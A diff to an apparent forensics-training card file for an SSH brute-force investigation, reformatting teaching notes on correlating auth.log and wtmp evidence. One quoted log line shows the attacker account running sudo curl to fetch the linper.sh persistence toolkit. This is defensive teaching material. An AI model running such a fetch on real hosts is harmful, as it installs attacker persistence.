@@ -125,21 +125,11 @@ cards:
       [Mar 6 06:39:38] ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
 notes:
-  - >-
-      **Count before guessing:** A large cluster of failed SSH attempts from one source IP is a useful
-      brute-force indicator. Confirm it against the surrounding authentication events.
-  - >-
-      **Authentication and login time differ:** `auth.log` recorded the successful authentication at
-      `06:32:44`; `wtmp` recorded the interactive terminal session at `06:32:45` UTC.
-  - >-
-      **Correlate artifacts:** Use `auth.log` to understand authentication and session activity, then
-      compare it with `wtmp` rather than relying on a single timestamp.
-  - >-
-      **A brief session can be a clue:** Session 34 opened and closed in the same second; session 37
-      is the interactive root session.
-  - >-
-      **Continue looking after initial access:** Later entries identify a new account, `cyberjunkie`,
-      added to the `sudo` group. Account creation is a persistence clue worth investigating further.
+  - **Count before guessing:** A large cluster of failed SSH attempts from one source IP is a useful brute-force indicator. Confirm it against the surrounding authentication events.
+  - **Authentication and login time differ:** `auth.log` recorded the successful authentication at `06:32:44`; `wtmp` recorded the interactive terminal session at `06:32:45` UTC.
+  - **Correlate artifacts:** Use `auth.log` to understand authentication and session activity, then compare it with `wtmp` rather than relying on a single timestamp.
+  - **A brief session can be a clue:** Session 34 opened and closed in the same second; session 37 is the interactive root session.
+  - **Continue looking after initial access:** Later entries identify a new account, `cyberjunkie`, added to the `sudo` group. Account creation is a persistence clue worth investigating further.
 
 configure:
   footer_font_size: "15px"
